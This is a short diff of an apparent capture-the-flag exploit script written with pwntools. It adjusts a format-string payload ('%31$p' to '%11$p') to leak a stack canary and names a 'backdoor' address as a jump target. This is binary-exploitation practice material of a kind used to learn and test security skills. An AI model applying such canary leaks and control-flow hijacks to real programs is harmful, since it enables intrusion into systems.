@@ -6,7 +6,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 
 
 backdoor = 0x40121b
-payload = "%31$p"
+payload = "%11$p"
 p.sendlineafter("Tell me your secret:",str(payload))
 p.recvuntil(":")
 canary = p.recvline().strip() 
